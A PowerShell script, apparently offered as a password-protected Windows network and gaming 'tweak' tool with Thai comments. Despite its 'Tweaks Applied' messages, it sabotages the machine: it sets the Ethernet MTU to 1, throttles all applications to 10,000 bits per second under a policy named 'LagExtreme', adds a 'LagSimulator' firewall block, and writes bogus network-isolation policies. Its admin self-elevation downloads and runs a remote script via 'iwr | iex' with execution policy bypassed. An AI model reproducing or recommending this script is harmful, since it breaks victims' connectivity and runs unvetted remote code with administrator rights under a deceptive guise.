# Run as Admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -Command `"iwr -useb https://raw.githubusercontent.com/badiphat-lang/windows-script/main/script.ps1 | iex`"" -Verb RunAs
    exit
}

# Password (hidden)
$securePass = Read-Host "Enter Password" -AsSecureString
$pass = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePass))

if ($pass -ne "dotexe") {
    Write-Host "Wrong Password" -ForegroundColor Red
    exit
}
# ปิดการแสดงผลทั้งหมด
$InformationPreference = "SilentlyContinue"
Write-Host "Successfully." -ForegroundColor Yellow

Write-Host "Running Script..." -ForegroundColor Cyan

Write-Host "Applying Network Isolation Tweaks..." -ForegroundColor Yellow

$path5 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\NetworkIsolation"

New-Item -Path $path5 -Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterpriseProxyServers" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterpriseCloudResources" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterpriseInternalProxyServers" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterpriseDomains" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterprisePrivateNetworkRanges" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

Write-Host "Network Isolation Tweaks Applied!" -ForegroundColor Green

Write-Host "Applying QoS Packet Scheduler Tweaks..." -ForegroundColor Yellow

$qos = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Psched"

New-Item -Path $qos -Force | Out-Null

New-ItemProperty -Path $qos `
-Name "MaxOutstandingSends" `
-PropertyType DWord `
-Value 12 `
-Force | Out-Null

New-ItemProperty -Path $qos `
-Name "NonBestEffortLimit" `
-PropertyType DWord `
-Value 12 `
-Force | Out-Null

New-ItemProperty -Path $qos `
-Name "TimerResolution" `
-PropertyType DWord `
-Value 12 `
-Force | Out-Null

Write-Host "QoS Tweaks Applied!" -ForegroundColor Green

Write-Host "Applying Network Provider Tweaks..." -ForegroundColor Yellow

$provider = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\NetworkProvider"

New-Item -Path $provider -Force | Out-Null

New-ItemProperty -Path $provider `
-Name "latancy" `
-PropertyType String `
-Value "999999999" `
-Force | Out-Null

Write-Host "Network Provider Tweaks Applied!" -ForegroundColor Green

Write-Host "Applying Background Apps Policy..." -ForegroundColor Yellow

$privacy = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy"

New-Item -Path $privacy -Force | Out-Null

New-ItemProperty -Path $privacy `
-Name "LetAppsRunInBackground" `
-PropertyType DWord `
-Value 2 `
-Force | Out-Null

Write-Host "Background Apps Forced Deny Applied!" -ForegroundColor Green

gpupdate /force

New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" -Name "NetworkThrottlingIndex" -Value 1 -PropertyType DWord -Force

cmd /c "netsh int tcp set global autotuninglevel=disabled"
cmd /c "netsh int tcp set global chimney=disabled"
cmd /c "netsh int tcp set global dca=disabled"
cmd /c "netsh int tcp set global rss=disabled"
cmd /c "netsh int tcp set global ecncapability=enabled"
cmd /c "netsh int tcp set global timestamps=enabled"
cmd /c "netsh int tcp set global rsc=disabled"
cmd /c "netsh int tcp set global fastopen=disabled"
cmd /c "netsh interface ipv4 set subinterface ""Ethernet"" mtu=1 store=active"
cmd /c "netsh interface ipv6 set subinterface ""Ethernet"" mtu=1 store=active"
cmd /c "netsh interface tcp set global congestionprovider=none"
cmd /c "netsh interface tcp set heuristics disabled"
cmd /c "netsh int tcp set global autotuninglevel=highlyrestricted"
cmd /c "netsh int tcp set global timestamps=enabled"
cmd /c "netsh int tcp set global ecncapability=enabled"
cmd /c "netsh int tcp set global rss=disabled"
cmd /c "netsh int tcp set global rsc=disabled"
cmd /c "netsh int tcp set global dca=disabled"
cmd /c "netsh int tcp set global chimney=disabled"
cmd /c "netsh advfirewall firewall add rule name=""LagSimulator"" dir=out action=block remoteip=1.1.1.1"
New-NetQosPolicy -Name "LagExtreme" -AppPathNameMatchCondition "*" -NetworkProfile All -ThrottleRateActionBitsPerSecond 10000

$kb = "HKCU:\Control Panel\Keyboard"
Set-ItemProperty -Path $kb -Name "InitialKeyboardIndicators" -Value "0"
Set-ItemProperty -Path $kb -Name "KeyboardDelay" -Value "1"
Set-ItemProperty -Path $kb -Name "KeyboardSpeed" -Value "31"

New-ItemProperty -Path $kb `
-Name "PrintScreenKeyForSnippingEnabled" `
-PropertyType DWord `
-Value 0 `
-Force | Out-Null

$mouse = "HKCU:\Control Panel\Mouse"
Set-ItemProperty -Path $mouse -Name "MouseSensitivity" -Value "10"
Set-ItemProperty -Path $mouse -Name "Beep" -Value "No"
Set-ItemProperty -Path $mouse -Name "DoubleClickHeight" -Value "4"
Set-ItemProperty -Path $mouse -Name "DoubleClickSpeed" -Value "200"
Set-ItemProperty -Path $mouse -Name "DoubleClickWidth" -Value "4"
Set-ItemProperty -Path $mouse -Name "ExtendedSounds" -Value "No"
Set-ItemProperty -Path $mouse -Name "MouseHoverHeight" -Value "4"
Set-ItemProperty -Path $mouse -Name "MouseHoverTime" -Value "400"
Set-ItemProperty -Path $mouse -Name "MouseHoverWidth" -Value "4"
Set-ItemProperty -Path $mouse -Name "MouseSensitivity" -Value "10"
Set-ItemProperty -Path $mouse -Name "MouseSpeed" -Value "0"
Set-ItemProperty -Path $mouse -Name "MouseThreshold1" -Value "0"
Set-ItemProperty -Path $mouse -Name "MouseThreshold2" -Value "0"
Set-ItemProperty -Path $mouse -Name "MouseTrails" -Value "0"
Set-ItemProperty -Path $mouse -Name "SnapToDefaultButton" -Value "0"
Set-ItemProperty -Path $mouse -Name "SwapMouseButtons" -Value "0"

Set-ItemProperty -Path $mouse -Name "SmoothMouseXCurve" -Type Binary -Value ([byte[]](0,0,0,0,0,0,0,0,21,110,0,0,0,0,0,0,0,64,1,0,0,0,0,0,41,220,3,0,0,0,0,0,0,0,40,0,0,0,0,0))

Set-ItemProperty -Path $mouse -Name "SmoothMouseYCurve" -Type Binary -Value ([byte[]](0,0,0,0,0,0,0,0,253,17,1,0,0,0,0,0,0,36,4,0,0,0,0,0,0,252,18,0,0,0,0,0,0,192,187,1,0,0,0,0))

$prio = "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl"

New-ItemProperty -Path $prio `
-Name "Win32PrioritySeparation" `
-PropertyType DWord `
-Value 38 `
-Force | Out-Null

$game = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"

New-ItemProperty -Path $game `
-Name "NetworkThrottlingIndex" `
-PropertyType DWord `
-Value 4294967295 `
-Force | Out-Null

New-ItemProperty -Path $game `
-Name "SystemResponsiveness" `
-PropertyType DWord `
-Value 0 `
-Force | Out-Null

# เปิดการแสดงผลกลับ
$InformationPreference = "Continue"

Write-Host "Gpedit X Successfully!" -ForegroundColor Green
